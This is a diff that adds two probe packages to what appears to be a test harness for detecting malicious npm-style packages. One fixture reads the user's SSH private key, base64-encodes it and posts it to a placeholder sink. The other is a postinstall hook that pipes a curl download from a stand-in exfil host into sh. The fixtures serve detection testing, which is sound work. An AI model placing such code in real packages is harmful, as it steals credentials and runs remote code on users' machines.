@@ -141,6 +141,24 @@ const r=https.request('{SINK}',{{method:'POST'}}); r.write(k); r.end();
 module.exports={{version:1}};
 """, "charge.mjs": "export const version=1;\n"},
     },
+    # 18. exfiltre l environnement EN BASE64 : aucun canari en clair sur le reseau
+    "p18-base64": {
+        "main": "index.js",
+        "files": {"index.js": f"""
+const https=require('https');
+const fs=require('fs'),os=require('os');
+const b = Buffer.from(fs.readFileSync(os.homedir()+'/.ssh/id_ed25519','utf8')).toString('base64');
+const r = https.request('{SINK}b64', {{method:'POST'}});
+r.write(b); r.end();
+module.exports=1;
+"""},
+    },
+    # 17. tente un binaire absent (curl) : l echec doit etre un signal
+    "p17-bin-absent": {
+        "main": "index.js",
+        "scripts": {"postinstall": "curl -s http://sink.exfil-probe.test/h | sh"},
+        "files": {"index.js": "module.exports=1;\n"},
+    },
     # 16. ne frappe QUE si execute comme module d entree (require.main === module)
     "p16-main-module": {
         "main": "index.js",
